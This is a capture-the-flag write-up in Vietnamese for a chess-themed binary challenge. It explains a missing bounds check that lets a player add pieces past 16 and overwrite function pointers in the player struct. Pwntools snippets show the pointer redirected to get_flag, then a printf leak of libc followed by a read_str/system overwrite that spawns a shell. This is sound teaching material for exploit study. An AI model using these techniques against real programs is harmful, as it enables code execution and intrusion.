Bài này mình được cung cấp cả source và hint nên việc tìm ra bug cũng không quá khó.

Hint: **Một người chơi có bao nhiêu quân cờ.**

# **BUG**

Xem qua file source, ta thấy struct player được định nghĩa như sau:
```
typedef struct player {
    int nuoc;
    int quan_luc;
    quan_co c[16];
    void (*di)(struct player *);
    void (*trash_talk)(struct player *);
    void (*them_quan)(struct player *, loai_quan_co, char *, mau_quan_co);
} player;
```
Như vậy, mỗi người chơi sẽ có tối đa 16 quân cờ. Tuy nhiên, đoạn code thêm quân phía bên dưới không kiểm tra số lượng quân cờ của người chơi:
```
switch (read_num()) {
            case 1:
                quan = read_quan();
                dan_do = read_dan_do();
                human->them_quan(human, quan, dan_do, ddo);
                printf("- Đã điều động thêm %s.\n", human->c[human->quan_luc-1].string);
                break;
```
```
void them_quan(player* p, loai_quan_co l, char *dan_do, mau_quan_co mau) {
    init_quan_co(&(p->c[p->quan_luc]), l, dan_do, mau);
    p->quan_luc += 1;
}
```
Điều này dẫn đến người chơi có thể nhập nhiều hơn 16 quân cờ và ghi đè được các hàm *di*, *trash_talk* và *them_quan*

# **Exploit**
## Sử dụng hàm get_flag có sẵn:

Do giới hạn của ctf 3 tiếng nên anh ra đề đã cung cấp sẵn 1 hàm *get_flag* để đọc flag.

Để tận dụng hàm này, ta chỉ cần thêm quân 16 lần, sau đó ở lần thứ 17 sẽ thêm 1 quân có giá trị *dan_do* là địa chỉ của hàm *get_flag*.
Khi đó, hàm *di* sẽ bị ghi đè bởi hàm *get_flag*. Sau đó, gọi hàm *di* để lấy flag:
```
        for i in range(16):
                them_quan("xe", "ahuhi")

# use get_flag
        them_quan("noob", p32(get_flag))

        r.sendline("2")
        r.interactive()
```

## Get shell:

Sau khi mình khai thác sử dụng lại hàm get_flag thành công, mình được khuyến khích là thử tìm cách để lấy được shell xem có được không.

Với zer0 kiến thức về khai thác trên heap, mình khá là betak khúc này. Sau đó, mình được anh @Bảo nói là trong trường hợp này, mình chỉ có thể control được con trỏ lệnh chứ không thể kiểm soát được đối số truyển vào. Do đó, mình phải tìm cách tận dụng lại các đối số này.

Sau một khoảng thời gian bế tắc again, mình có hỏi và nhận được một super hint siêu to khổng lồ từ "ĐẤNG" @HoàngThắng là có thể sử dụng *printf* để leak địa chỉ hàm *__libc_start_main* ở trong stack.

OK, có hint super value rồi, triển khai thôi:

### Leak address:

Sau một thời gian tìm trong source code của bài, mình thấy hàm *read_str* có nhiệm vụ đọc chuỗi vào một địa chỉ truyển vào:
```
void read_str(char *buf, unsigned int size) {
    int ret;
    ret = read(0, buf, size);

    if (ret <= 0) {
        puts("read error");
        exit(1);
    }

    buf[ret-1] = '\x00';
}
```
Vì vậy mình có thể tận dụng lại hàm này để lưu formatstring mình cần vào tại địa chỉ của *human*. Sau đó, ghi đè hàm *di* thành hàm *printf* và gọi nó để leak giá trị bên trong stack:

Ở đây, vị trí mình cần leak ra nằm ở vị trí từ 16 trong stack, vậy formatstring cần sử dụng là __%15$p__:

![show_stack](https://github.com/tykawaii/CTF/blob/master/Writeups/uitctf/cokhichtuong/images/stack.PNG)

Và giá trị mình leak ra được là **__libc_start_main + 247** => **Libc base = leak - 247 - __libc_start_main offset**

![leak address](https://github.com/tykawaii/CTF/blob/master/Writeups/uitctf/cokhichtuong/images/leak.PNG)

Sau khi leak và tính toán được các địa chỉ cần thiết, mình sử dụng lại hàm *them_quan* để ghi đè hàm system vào địa chỉ hàm bất kì, ở đây mình chọn hàm *khich_tuong*.

Tuy nhiên, vị trí của các giá trị mình ghi vào có phụ thuộc vào giá trị của biến *quan_luc* trong struct player. Do đó, trước khi thêm quân, mình cần phải sửa lại giá trị này thành 0x10(16):
```
        r.recvuntil("> ")
        r.sendline("2")
        r.sendline("\x00"*4 + "\x10\x00\x00\x00")
```

Sau khi sửa lại giá trị *quan_luc*, thêm 1 quân để ghi đè 2 hàm *di* và hàm *khich_tuong* bằng 2 hàm *read_str* và hàm *system*.

Cuối cùng, để lấy shell, gọi hàm *di* (đã bị ghi đè thành *read_str*) để truyển vào chuỗi "/bin/sh" và gọi *khich_tuong* để thực hiện *system("/bin/sh")*:
```
        r.recvuntil("> ")
        them_quan("noob", p32(read_str)+p32(system))

        r.sendline("2")
        r.sendline("/bin/sh")

        r.recvuntil("> ")
        r.sendline("3")

```
![get_shell](https://github.com/tykawaii/CTF/blob/master/Writeups/uitctf/cokhichtuong/images/final.PNG)

Cảm ơn mọi người đã đọc hết write-up của mình :smile:
